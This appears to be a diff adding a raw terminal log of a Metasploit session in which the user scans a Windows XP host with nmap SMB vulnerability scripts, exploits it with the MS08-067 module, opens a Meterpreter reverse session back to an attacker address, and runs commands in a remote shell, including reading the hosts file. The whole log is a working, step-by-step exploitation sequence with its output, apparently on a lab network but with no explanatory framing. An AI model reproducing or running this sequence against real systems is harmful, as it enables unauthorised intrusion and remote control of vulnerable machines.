@@ -1,0 +1,73 @@
+root@kali:~# msfconsole
+msf > nmap -sT -O --script=smb-check-vulns -P0 192.168.2.92
+msf > nmap -sT -O --script=smb-check-vulns --script-args=unsafe=1 -P0 192.168.2.92
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > show targets
+msf exploit(ms08_067_netapi) > set TARGET 46
+msf exploit(ms08_067_netapi) > set RHOST 192.168.2.92
+msf exploit(ms08_067_netapi) > set LHOST 192.168.2.80
+msf exploit(ms08_067_netapi) > set LPORT 8080
+msf exploit(ms08_067_netapi) > show options
+msf exploit(ms08_067_netapi) > exploit -j
+msf exploit(ms08_067_netapi) > sessions -l
+msf exploit(ms08_067_netapi) > sessions -i 1
+meterpreter > shell
+Process 1600 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>ver
+ver
+
+Microsoft Windows XP [Version 5.1.2600]
+
+C:\WINDOWS\system32>whoami
+whoami
+'whoami' は、内部コマンドまたは外部コマンド、
+操作可能なプログラムまたはバッチ ファイルとして認識されていません。
+
+C:\WINDOWS\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter ローカル エリア接続:
+
+        Connection-specific DNS Suffix  . : 
+        IP Address. . . . . . . . . . . . : 192.168.2.92
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.2.1
+
+C:\WINDOWS\system32>type C:\WINDOWS\system33`^H2^H^H^[[3~^[[3~^[[3~^[[3~^H^C
+Terminate channel 1? [y/N]  n
+
+
+C:\WINDOWS\system32>type C:\WINDOWS\system32\drivers\etc\hosts
+type C:\WINDOWS\system32\drivers\etc\hosts
+# Copyright (c) 1993-1999 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+127.0.0.1       localhost
+
+C:\WINDOWS\system32>exit
+exit
+meterpreter > exit
+msf exploit(ms08_067_netapi) > exit
+root@kali:~# logout
